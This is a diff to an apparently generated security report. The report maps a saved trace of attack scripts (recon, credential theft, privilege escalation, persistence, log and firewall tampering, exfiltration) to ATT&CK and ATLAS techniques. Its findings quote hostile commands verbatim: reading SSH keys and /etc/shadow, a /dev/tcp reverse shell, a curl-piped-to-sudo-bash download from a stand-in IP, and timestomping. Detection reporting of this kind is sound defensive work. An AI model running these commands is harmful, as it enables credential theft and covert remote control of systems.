@@ -48,15 +48,63 @@ tr.detail td { padding-top: 0; }
 .dot { position: absolute; left: -27px; top: 13px; width: 12px; height: 12px; border-radius: 50%;
   background: currentColor; border: 2px solid var(--bg); }
 .head { display: flex; flex-wrap: wrap; align-items: baseline; gap: 2px 12px; }
-.head .mark { font-weight: 600; }
+.head .mark { flex: 0 0 28px; min-width: 0; white-space: nowrap; font-weight: 600;
+  font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 .name { font-weight: 600; font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; overflow-wrap: anywhere; }
 .rest { color: var(--soft); font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; font-size: 13px;
   overflow-wrap: anywhere; }
-.items { display: grid; grid-template-columns: max-content minmax(0, 1fr); gap: 2px 14px; margin-top: 6px;
-  font-size: 13px; }
-.id { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
-.items .value { font-family: inherit; }
-.plain { grid-column: 1 / -1; color: var(--soft); }
+.line { display: grid; grid-template-columns: 8em 24em 4.5em 10em 8em minmax(0, 1fr); column-gap: 10px;
+  align-items: baseline; padding: 1px 0; font-size: 13px; }
+.head + .line { margin-top: 6px; }
+.line.begins, .line:not(.more) + .more { margin-top: 4px; padding-top: 5px; border-top: 1px solid var(--line); }
+.marked .line { margin-left: 40px; }
+.id { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; white-space: nowrap; }
+.what { overflow-wrap: anywhere; }
+.what + .id { padding-left: 18px; }
+.id:first-child + .what { font-weight: 600; }
+.id.kind, .id.far { color: var(--soft); }
+.id.kind { font-family: inherit; }
+.id.kind + .what { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; font-weight: 400; }
+.tag { grid-column: 1; font-weight: 600; }
+.more .value { grid-column: 2 / -1; }
+.said { grid-column: 1 / -1; color: var(--soft); }
+.heads { list-style: none; padding: 0 12px; margin: 0 0 6px; }
+.heads span { grid-column: span 2; width: 0; white-space: nowrap; font-size: 12px; text-transform: uppercase;
+  letter-spacing: .04em; color: var(--soft); }
+.heads span + span { padding-left: 18px; }
+@supports (grid-template-columns: subgrid) {
+  .blocks { display: grid; column-gap: 10px;
+    grid-template-columns: max-content fit-content(44ch) max-content max-content max-content minmax(12ch, 1fr); }
+  .block, .heads { grid-column: 1 / -1; display: grid; grid-template-columns: subgrid; }
+  .head, .line { grid-column: 1 / -1; }
+  .line { grid-template-columns: subgrid; }
+}
+@media (max-width: 1040px) {
+  .heads { display: none; }
+  .marked .line { margin-left: 0; }
+  .line { grid-template-columns: 8em 4.5em 10em 8em minmax(0, 1fr); row-gap: 2px; }
+  .line > :empty { display: none; }
+  .line > .id:first-child, .line > .tag { grid-column: 1; }
+  .line > .id:first-child + .what, .more .value { grid-column: 2 / -1; }
+  .line > :nth-child(3) { grid-column: 2; padding-left: 0; }
+  .line > :nth-child(4) { grid-column: 3; }
+  .line > :nth-child(5) { grid-column: 4; }
+  .line > :nth-child(6) { grid-column: 5; }
+}
+@media (max-width: 640px) {
+  .line { grid-template-columns: 8em 8em minmax(0, 1fr); }
+  .line > :nth-child(5) { grid-column: 2; padding-left: 0; }
+  .line > :nth-child(6) { grid-column: 3; }
+}
+@supports (grid-template-columns: subgrid) {
+  @media (max-width: 1040px) {
+    .blocks { grid-template-columns: repeat(4, max-content) minmax(0, 1fr); }
+    .line { grid-template-columns: subgrid; }
+  }
+  @media (max-width: 640px) {
+    .blocks { grid-template-columns: max-content max-content minmax(0, 1fr); }
+  }
+}
 footer { margin-top: 40px; font-size: 13px; border-top: 1px solid var(--line); padding-top: 10px; }
 footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 @media print { nav { display: none; } body { padding: 0; } table { min-width: 0; } }
@@ -88,7 +136,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tbody>
 <tr class="entry"><td class="cell">files</td><td class="cell">14</td><td class="cell">7 scripts, 7 outputs</td></tr>
 <tr class="entry"><td class="cell">indicators</td><td class="cell">15</td><td class="cell">4 Domain, 1 Email, 7 IPv4, 3 URL</td></tr>
-<tr class="entry"><td class="cell">activities</td><td class="cell">26</td><td class="cell"></td></tr>
+<tr class="entry"><td class="cell">activities</td><td class="cell">28</td><td class="cell"></td></tr>
 <tr class="entry"><td class="cell">tactics</td><td class="cell">11</td><td class="cell"></td></tr>
 <tr class="entry"><td class="cell">targeted</td><td class="cell">5</td><td class="cell">Hostnames 1, IP addresses 4</td></tr>
 <tr class="entry"><td class="cell">exposed</td><td class="cell">18</td><td class="cell">Passwords and secrets 3, Usernames 6, Email addresses 1, Devices 2, IP addresses 6</td></tr>
@@ -105,105 +153,100 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tbody>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">CommandAndControl</td><td class="cell">TA0011, AML.TA0014</td><td class="cell">20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py</td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">CredentialAccess</td><td class="cell">TA0006, AML.TA0013</td><td class="cell">20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">DefenseImpairment</td><td class="cell">TA0112, AML.TA0007</td><td class="cell">20261022_092000_step05_evade.sh</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">DefenseImpairment</td><td class="cell">TA0112, AML.TA0007</td><td class="cell">20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl</td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Exfiltration</td><td class="cell">TA0010, AML.TA0010</td><td class="cell">20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py</td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">LateralMovement</td><td class="cell">TA0008, AML.TA0015</td><td class="cell">20261022_092500_step06_stage.sh</td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">Persistence</td><td class="cell">TA0003, AML.TA0006</td><td class="cell">20261022_091500_step04_persist.sh</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">Persistence</td><td class="cell">TA0003, AML.TA0006</td><td class="cell">20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl</td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">PrivilegeEscalation</td><td class="cell">TA0004, AML.TA0012</td><td class="cell">20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh</td></tr>
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">Collection</td><td class="cell">TA0009, AML.TA0009</td><td class="cell">20261022_092500_step06_stage.sh</td></tr>
-<tr class="entry"><td class="mark medium">[!]</td><td class="cell">Execution</td><td class="cell">TA0002, AML.TA0005</td><td class="cell">20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py</td></tr>
+<tr class="entry"><td class="mark medium">[!]</td><td class="cell">Execution</td><td class="cell">TA0002, AML.TA0005</td><td class="cell">20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py and 1 more</td></tr>
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">Stealth</td><td class="cell">TA0005, AML.TA0007</td><td class="cell">20261022_092000_step05_evade.sh</td></tr>
-<tr class="entry"><td class="mark low">[i]</td><td class="cell">Discovery</td><td class="cell">TA0007, AML.TA0008</td><td class="cell">20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 1 more</td></tr>
+<tr class="entry"><td class="mark low">[i]</td><td class="cell">Discovery</td><td class="cell">TA0007, AML.TA0008</td><td class="cell">20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 3 more</td></tr>
 </tbody>
 </table>
 </div>
 </section>
 <section id="section-3">
 <h2>Timeline</h2>
-<p class="note">a block for each intent, from the first of its files to be created until the last, or for each period of files that show the same tactics, with the techniques its files show</p>
-<ol class="blocks">
+<p class="note">a block for each intent, from the first of its files to be created until the last, or for each period of files that show the same tactics; a row is an ATT&amp;CK technique, then its tactic and its ATLAS technique, or the tools of a tactic that no technique is named for</p>
+<ol class="blocks marked">
+<li class="heads"><div class="line"><span>ATT&amp;CK technique</span><span>tactic</span><span>ATLAS technique</span></div></li>
 <li class="block"><span class="dot high"></span>
-<div class="head"><span class="mark high">[x]</span><span class="name">Discovery, CredentialAccess</span><span class="rest">2026-10-22T09:00:00Z to 2026-10-22T09:05:00Z</span></div>
-<div class="items">
-<span class="id">T1083</span><span class="value">File and Directory Discovery</span>
-<span class="id">T1552.005</span><span class="value">Unsecured Credentials: Cloud Instance Metadata API</span>
-<span class="id">T1007</span><span class="value">System Service Discovery</span>
-<span class="id">T1003.008</span><span class="value">OS Credential Dumping: /etc/passwd and /etc/shadow</span>
-<span class="id">T1552.004</span><span class="value">Unsecured Credentials: Private Keys</span>
-<span class="id">T1552.001</span><span class="value">Unsecured Credentials: Credentials In Files</span>
-<span class="id">T1552.003</span><span class="value">Unsecured Credentials: Shell History</span>
-<span class="id">T1552.007</span><span class="value">Unsecured Credentials: Container API</span>
-<span class="id">AML.T0055</span><span class="value">Unsecured Credentials</span>
-<span class="id">AML.T0090</span><span class="value">OS Credential Dumping</span>
-</div>
+<div class="head"><span class="mark high">[x]</span><span class="name">Discovery, CredentialAccess</span><span class="rest">2026-10-22T09:00:00Z to 2026-10-22T09:05:40Z</span></div>
+<div class="line"><span class="id">T1083</span><span class="what">File and Directory Discovery</span><span class="id far">TA0007</span><span class="what">Discovery</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1007</span><span class="what">System Service Discovery</span><span class="id far">TA0007</span><span class="what">Discovery</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1087.001</span><span class="what">Account Discovery: Local Account</span><span class="id far">TA0007</span><span class="what">Discovery</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1087.003</span><span class="what">Account Discovery: Email Account</span><span class="id far">TA0007</span><span class="what">Discovery</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id kind">tools</span><span class="what">id, uname, find, kubectl</span><span class="id far">TA0007</span><span class="what">Discovery</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1552.005</span><span class="what">Unsecured Credentials: Cloud Instance Metadata API</span><span class="id far">TA0006</span><span class="what">CredentialAccess</span><span class="id">AML.T0055</span><span class="what">Unsecured Credentials</span></div>
+<div class="line begins"><span class="id">T1003.008</span><span class="what">OS Credential Dumping: /etc/passwd and /etc/shadow</span><span class="id far">TA0006</span><span class="what">CredentialAccess</span><span class="id">AML.T0090</span><span class="what">OS Credential Dumping</span></div>
+<div class="line begins"><span class="id">T1552.004</span><span class="what">Unsecured Credentials: Private Keys</span><span class="id far">TA0006</span><span class="what">CredentialAccess</span><span class="id">AML.T0055</span><span class="what">Unsecured Credentials</span></div>
+<div class="line begins"><span class="id">T1552.001</span><span class="what">Unsecured Credentials: Credentials In Files</span><span class="id far">TA0006</span><span class="what">CredentialAccess</span><span class="id">AML.T0055</span><span class="what">Unsecured Credentials</span></div>
+<div class="line begins"><span class="id">T1552.003</span><span class="what">Unsecured Credentials: Shell History</span><span class="id far">TA0006</span><span class="what">CredentialAccess</span><span class="id">AML.T0055</span><span class="what">Unsecured Credentials</span></div>
+<div class="line begins"><span class="id">T1552.007</span><span class="what">Unsecured Credentials: Container API</span><span class="id far">TA0006</span><span class="what">CredentialAccess</span><span class="id">AML.T0055</span><span class="what">Unsecured Credentials</span></div>
 </li>
 <li class="block"><span class="dot high"></span>
 <div class="head"><span class="mark high">[x]</span><span class="name">Discovery, PrivilegeEscalation</span><span class="rest">2026-10-22T09:10:00Z</span></div>
-<div class="items">
-<span class="id">T1548.003</span><span class="value">Abuse Elevation Control Mechanism: Sudo and Sudo Caching</span>
-<span class="id">T1548.001</span><span class="value">Abuse Elevation Control Mechanism: Setuid and Setgid</span>
-<span class="id">T1611</span><span class="value">Escape to Host</span>
-<span class="id">AML.T0105</span><span class="value">Escape to Host</span>
-</div>
+<div class="line"><span class="id kind">tools</span><span class="what">docker</span><span class="id far">TA0007</span><span class="what">Discovery</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1548.003</span><span class="what">Abuse Elevation Control Mechanism: Sudo and Sudo Caching</span><span class="id far">TA0004</span><span class="what">PrivilegeEscalation</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1548.001</span><span class="what">Abuse Elevation Control Mechanism: Setuid and Setgid</span><span class="id far">TA0004</span><span class="what">PrivilegeEscalation</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1611</span><span class="what">Escape to Host</span><span class="id far">TA0004</span><span class="what">PrivilegeEscalation</span><span class="id">AML.T0105</span><span class="what">Escape to Host</span></div>
 </li>
 <li class="block"><span class="dot high"></span>
 <div class="head"><span class="mark high">[x]</span><span class="name">Execution, PrivilegeEscalation, Persistence</span><span class="rest">2026-10-22T09:15:00Z</span></div>
-<div class="items">
-<span class="id">T1053.003</span><span class="value">Scheduled Task/Job: Cron</span>
-<span class="id">T1053.002</span><span class="value">Scheduled Task/Job: At</span>
-<span class="id">T1053.006</span><span class="value">Scheduled Task/Job: Systemd Timers</span>
-<span class="id">T1543.002</span><span class="value">Create or Modify System Process: Systemd Service</span>
-<span class="id">T1136.001</span><span class="value">Create Account: Local Account</span>
-<span class="id">T1098.004</span><span class="value">Account Manipulation: SSH Authorized Keys</span>
-<span class="id">T1546.004</span><span class="value">Event Triggered Execution: Unix Shell Configuration Modification</span>
-<span class="id">AML.T0125</span><span class="value">Create Account</span>
-<span class="id">AML.T0142</span><span class="value">Event Triggered Execution</span>
-</div>
+<div class="line"><span class="id">T1053.003</span><span class="what">Scheduled Task/Job: Cron</span><span class="id far">TA0002</span><span class="what">Execution</span><span class="id"></span><span class="what"></span></div>
+<div class="line"><span class="id"></span><span class="what"></span><span class="id far">TA0003</span><span class="what">Persistence</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1053.002</span><span class="what">Scheduled Task/Job: At</span><span class="id far">TA0002</span><span class="what">Execution</span><span class="id"></span><span class="what"></span></div>
+<div class="line"><span class="id"></span><span class="what"></span><span class="id far">TA0003</span><span class="what">Persistence</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1053.006</span><span class="what">Scheduled Task/Job: Systemd Timers</span><span class="id far">TA0002</span><span class="what">Execution</span><span class="id"></span><span class="what"></span></div>
+<div class="line"><span class="id"></span><span class="what"></span><span class="id far">TA0003</span><span class="what">Persistence</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1543.002</span><span class="what">Create or Modify System Process: Systemd Service</span><span class="id far">TA0004</span><span class="what">PrivilegeEscalation</span><span class="id"></span><span class="what"></span></div>
+<div class="line"><span class="id"></span><span class="what"></span><span class="id far">TA0003</span><span class="what">Persistence</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1136.001</span><span class="what">Create Account: Local Account</span><span class="id far">TA0003</span><span class="what">Persistence</span><span class="id">AML.T0125</span><span class="what">Create Account</span></div>
+<div class="line begins"><span class="id">T1098.004</span><span class="what">Account Manipulation: SSH Authorized Keys</span><span class="id far">TA0003</span><span class="what">Persistence</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1546.004</span><span class="what">Event Triggered Execution: Unix Shell Configuration Modification</span><span class="id far">TA0003</span><span class="what">Persistence</span><span class="id">AML.T0142</span><span class="what">Event Triggered Execution</span></div>
 </li>
 <li class="block"><span class="dot high"></span>
 <div class="head"><span class="mark high">[x]</span><span class="name">Stealth, DefenseImpairment</span><span class="rest">2026-10-22T09:20:00Z</span></div>
-<div class="items">
-<span class="id">T1685.006</span><span class="value">Disable or Modify Tools: Clear Linux or Mac System Logs</span>
-<span class="id">T1070.003</span><span class="value">Indicator Removal: Clear Command History</span>
-<span class="id">T1690</span><span class="value">Prevent Command History Logging</span>
-<span class="id">T1685</span><span class="value">Disable or Modify Tools</span>
-<span class="id">T1685.004</span><span class="value">Disable or Modify Tools: Disable or Modify Linux Audit System Log</span>
-<span class="id">T1686</span><span class="value">Disable or Modify System Firewall</span>
-<span class="id">T1070.006</span><span class="value">Indicator Removal: Timestomp</span>
-<span class="id">AML.T0138</span><span class="value">Indicator Removal</span>
-</div>
+<div class="line"><span class="id">T1070.003</span><span class="what">Indicator Removal: Clear Command History</span><span class="id far">TA0005</span><span class="what">Stealth</span><span class="id">AML.T0138</span><span class="what">Indicator Removal</span></div>
+<div class="line begins"><span class="id">T1070.006</span><span class="what">Indicator Removal: Timestomp</span><span class="id far">TA0005</span><span class="what">Stealth</span><span class="id">AML.T0138</span><span class="what">Indicator Removal</span></div>
+<div class="line begins"><span class="id">T1685.006</span><span class="what">Disable or Modify Tools: Clear Linux or Mac System Logs</span><span class="id far">TA0112</span><span class="what">DefenseImpairment</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1690</span><span class="what">Prevent Command History Logging</span><span class="id far">TA0112</span><span class="what">DefenseImpairment</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1685</span><span class="what">Disable or Modify Tools</span><span class="id far">TA0112</span><span class="what">DefenseImpairment</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1685.004</span><span class="what">Disable or Modify Tools: Disable or Modify Linux Audit System Log</span><span class="id far">TA0112</span><span class="what">DefenseImpairment</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1686</span><span class="what">Disable or Modify System Firewall</span><span class="id far">TA0112</span><span class="what">DefenseImpairment</span><span class="id"></span><span class="what"></span></div>
 </li>
 <li class="block"><span class="dot high"></span>
 <div class="head"><span class="mark high">[x]</span><span class="name">Discovery, LateralMovement, Execution, Collection, CommandAndControl, Exfiltration</span><span class="rest">2026-10-22T09:25:00Z to 2026-10-22T09:30:00Z</span></div>
-<div class="items">
-<span class="id">T1048</span><span class="value">Exfiltration Over Alternative Protocol</span>
-<span class="id">T1560.001</span><span class="value">Archive Collected Data: Archive via Utility</span>
-<span class="id">T1059.004</span><span class="value">Command and Scripting Interpreter: Unix Shell</span>
-<span class="id">T1105</span><span class="value">Ingress Tool Transfer</span>
-<span class="id">T1095</span><span class="value">Non-Application Layer Protocol</span>
-<span class="id">AML.T0025</span><span class="value">Exfiltration via Cyber Means</span>
-<span class="id">AML.T0072</span><span class="value">Cyber Communication Channel</span>
-<span class="id">AML.T0050</span><span class="value">Command and Scripting Interpreter</span>
-</div>
+<div class="line"><span class="id kind">tools</span><span class="what">find, id, uname</span><span class="id far">TA0007</span><span class="what">Discovery</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1021.004</span><span class="what">Remote Services: SSH</span><span class="id far">TA0008</span><span class="what">LateralMovement</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1059.004</span><span class="what">Command and Scripting Interpreter: Unix Shell</span><span class="id far">TA0002</span><span class="what">Execution</span><span class="id">AML.T0050</span><span class="what">Command and Scripting Interpreter</span></div>
+<div class="line begins"><span class="id">T1059</span><span class="what">Command and Scripting Interpreter</span><span class="id far">TA0002</span><span class="what">Execution</span><span class="id">AML.T0050</span><span class="what">Command and Scripting Interpreter</span></div>
+<div class="line begins"><span class="id">T1560.001</span><span class="what">Archive Collected Data: Archive via Utility</span><span class="id far">TA0009</span><span class="what">Collection</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1105</span><span class="what">Ingress Tool Transfer</span><span class="id far">TA0011</span><span class="what">CommandAndControl</span><span class="id">AML.T0072</span><span class="what">Cyber Communication Channel</span></div>
+<div class="line begins"><span class="id">T1095</span><span class="what">Non-Application Layer Protocol</span><span class="id far">TA0011</span><span class="what">CommandAndControl</span><span class="id">AML.T0072</span><span class="what">Cyber Communication Channel</span></div>
+<div class="line begins"><span class="id">T1048</span><span class="what">Exfiltration Over Alternative Protocol</span><span class="id far">TA0010</span><span class="what">Exfiltration</span><span class="id">AML.T0025</span><span class="what">Exfiltration via Cyber Means</span></div>
+<div class="line begins"><span class="id kind">tools</span><span class="what">nc</span><span class="id far">TA0010</span><span class="what">Exfiltration</span><span class="id"></span><span class="what"></span></div>
 </li>
 <li class="block"><span class="dot high"></span>
 <div class="head"><span class="mark high">[x]</span><span class="name">Execution, Persistence, DefenseImpairment</span><span class="rest">2026-10-22T09:35:00Z</span></div>
-<div class="items">
-<span class="id">T1053.003</span><span class="value">Scheduled Task/Job: Cron</span>
-<span class="id">T1053.002</span><span class="value">Scheduled Task/Job: At</span>
-<span class="id">T1053.006</span><span class="value">Scheduled Task/Job: Systemd Timers</span>
-<span class="id">T1136.001</span><span class="value">Create Account: Local Account</span>
-<span class="id">T1685</span><span class="value">Disable or Modify Tools</span>
-<span class="id">T1685.004</span><span class="value">Disable or Modify Tools: Disable or Modify Linux Audit System Log</span>
-<span class="id">T1686</span><span class="value">Disable or Modify System Firewall</span>
-<span class="id">AML.T0125</span><span class="value">Create Account</span>
-</div>
+<div class="line"><span class="id">T1053.003</span><span class="what">Scheduled Task/Job: Cron</span><span class="id far">TA0002</span><span class="what">Execution</span><span class="id"></span><span class="what"></span></div>
+<div class="line"><span class="id"></span><span class="what"></span><span class="id far">TA0003</span><span class="what">Persistence</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1053.002</span><span class="what">Scheduled Task/Job: At</span><span class="id far">TA0002</span><span class="what">Execution</span><span class="id"></span><span class="what"></span></div>
+<div class="line"><span class="id"></span><span class="what"></span><span class="id far">TA0003</span><span class="what">Persistence</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1053.006</span><span class="what">Scheduled Task/Job: Systemd Timers</span><span class="id far">TA0002</span><span class="what">Execution</span><span class="id"></span><span class="what"></span></div>
+<div class="line"><span class="id"></span><span class="what"></span><span class="id far">TA0003</span><span class="what">Persistence</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1059.004</span><span class="what">Command and Scripting Interpreter: Unix Shell</span><span class="id far">TA0002</span><span class="what">Execution</span><span class="id">AML.T0050</span><span class="what">Command and Scripting Interpreter</span></div>
+<div class="line begins"><span class="id">T1136.001</span><span class="what">Create Account: Local Account</span><span class="id far">TA0003</span><span class="what">Persistence</span><span class="id">AML.T0125</span><span class="what">Create Account</span></div>
+<div class="line begins"><span class="id">T1685</span><span class="what">Disable or Modify Tools</span><span class="id far">TA0112</span><span class="what">DefenseImpairment</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1685.004</span><span class="what">Disable or Modify Tools: Disable or Modify Linux Audit System Log</span><span class="id far">TA0112</span><span class="what">DefenseImpairment</span><span class="id"></span><span class="what"></span></div>
+<div class="line begins"><span class="id">T1686</span><span class="what">Disable or Modify System Firewall</span><span class="id far">TA0112</span><span class="what">DefenseImpairment</span><span class="id"></span><span class="what"></span></div>
 </li>
 </ol>
 <div class="wrap">
 <table>
 <tbody>
-<tr class="entry"><td class="cell">and 6 files that show no tactic, in the saved trace</td></tr>
+<tr class="entry"><td class="cell">and 4 files that show no tactic, in the saved trace</td></tr>
 </tbody>
 </table>
 </div>
@@ -257,7 +300,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="detail"><td colspan="5"><div class="under">
 <div class="pair"><span class="label">what</span><span class="value">cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)</span></div>
 </div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">ReverseShell</td><td class="cell">1 line</td><td class="cell">CommandAndControl, Execution</td><td class="cell">T1059.004, T1095, AML.T0050</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">ReverseShell</td><td class="cell">1 line</td><td class="cell">CommandAndControl, Execution</td><td class="cell">T1059.004, T1095, AML.T0050, AML.T0072</td></tr>
 <tr class="detail"><td colspan="5"><div class="under">
 <div class="pair"><span class="label">what</span><span class="value">os.system(&#34;exec 3&lt;&gt;/dev/tcp/$H/$PORT&#34;) (20261022_093000_step07_channel.py:8)</span></div>
 </div></td></tr>
@@ -279,7 +322,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="detail"><td colspan="5"><div class="under">
 <div class="pair"><span class="label">what</span><span class="value">sudo cat /etc/shadow &gt; shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)</span></div>
 </div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">ShellDownloadAndExecute</td><td class="cell">1 line</td><td class="cell">CommandAndControl, Execution</td><td class="cell">T1059.004, T1105, AML.T0072, AML.T0050</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">ShellDownloadAndExecute</td><td class="cell">1 line</td><td class="cell">CommandAndControl, Execution</td><td class="cell">T1059.004, T1105, AML.T0050, AML.T0072</td></tr>
 <tr class="detail"><td colspan="5"><div class="under">
 <div class="pair"><span class="label">what</span><span class="value">sudo bash -c &#34;$(curl -fsSL http://203.0.113.40/s.sh)&#34; (20261022_092500_step06_stage.sh:4)</span></div>
 </div></td></tr>
@@ -316,6 +359,17 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">Timestomp</td><td class="cell">1 line</td><td class="cell">Stealth</td><td class="cell">T1070.006, AML.T0138</td></tr>
 <tr class="detail"><td colspan="5"><div class="under">
 <div class="pair"><span class="label">what</span><span class="value">touch -r /bin/ls &#34;$F&#34; (20261022_092000_step05_evade.sh:8)</span></div>
+</div></td></tr>
+<tr class="entry"><td class="mark low">[i]</td><td class="cell">EmailAccountDiscovery</td><td class="cell">1 line</td><td class="cell">Discovery</td><td class="cell">T1087.003</td></tr>
+<tr class="detail"><td colspan="5"><div class="under">
+<div class="pair"><span class="label">what</span><span class="value">SMTP_USER=alerts@corp.example (env_20261022_090540.txt:4)</span></div>
+</div></td></tr>
+<tr class="entry"><td class="mark low">[i]</td><td class="cell">LocalAccountDiscovery</td><td class="cell">4 lines</td><td class="cell">Discovery</td><td class="cell">T1087.001</td></tr>
+<tr class="detail"><td colspan="5"><div class="under">
+<div class="pair"><span class="label">what</span><span class="value">root:x:0:0:root:/root:/bin/bash (passwd_20261022_090020.txt:1)</span></div>
+<div class="pair"><span class="label"></span><span class="value">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin (passwd_20261022_090020.txt:2)</span></div>
+<div class="pair"><span class="label"></span><span class="value">deploy:x:1000:1000:Deploy:/home/deploy:/bin/bash (passwd_20261022_090020.txt:3)</span></div>
+<div class="pair"><span class="label"></span><span class="value">and 1 more in the saved findings</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark low">[i]</td><td class="cell">ServiceDiscovery</td><td class="cell">1 line</td><td class="cell">Discovery</td><td class="cell">T1007</td></tr>
 <tr class="detail"><td colspan="5"><div class="under">
@@ -825,7 +879,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <p>User Training involves educating employees and contractors on recognizing, reporting, and preventing cyber threats that rely on human interaction, such as phishing, social engineering, and other manipulative techniques.</p>
 <div class="pair"><span class="label">for</span><span class="value">CredentialFileRead</span></div>
 </div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1018 User Account Management</td><td class="cell">T1048, T1053.002, T1053.003, T1053.006, T1098.004, T1543.002, T1552.007, T1685, T1685.004, T1686</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1018 User Account Management</td><td class="cell">T1021.004, T1048, T1053.002, T1053.003, T1053.006, T1098.004, T1543.002, T1552.007, T1685, T1685.004, T1686</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>User Account Management involves implementing and enforcing policies for the lifecycle of user accounts, including creation, modification, and deactivation.</p>
 <div class="pair"><span class="label">for</span><span class="value">FileUpload, ScheduledJobCreation, SshKeyPersistence, SystemdUnitCreation, ClusterSecretRead, SecurityToolDisabling, FirewallDisabling</span></div>
@@ -840,7 +894,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <p>Restricting registry permissions involves configuring access control settings for sensitive registry keys and hives to ensure that only authorized users or processes can make modifications.</p>
 <div class="pair"><span class="label">for</span><span class="value">SecurityToolDisabling, FirewallDisabling</span></div>
 </div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1026 Privileged Account Management</td><td class="cell">T1003.008, T1053.002, T1053.006, T1136.001, T1543.002, T1548.003, T1552.007, T1611</td></tr>
+<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1026 Privileged Account Management</td><td class="cell">T1003.008, T1053.002, T1053.006, T1059, T1136.001, T1543.002, T1548.003, T1552.007, T1611</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Privileged Account Management focuses on implementing policies, controls, and tools to securely manage privileged accounts (e.g., SYSTEM, root, or administrative accounts).</p>
 <div class="pair"><span class="label">exposed</span><span class="value">username: svc</span></div>
@@ -851,10 +905,14 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <p>Set and enforce secure password policies for accounts to reduce the likelihood of unauthorized access.</p>
 <div class="pair"><span class="label">for</span><span class="value">ShadowFileRead, CredentialFileRead, PrivateKeyRead</span></div>
 </div></td></tr>
-<tr class="entry"><td class="mark high">[x]</td><td class="cell">M1028 Operating System Configuration</td><td class="cell">T1053.002, T1548.001, T1548.003, T1552.003, T1690</td></tr>
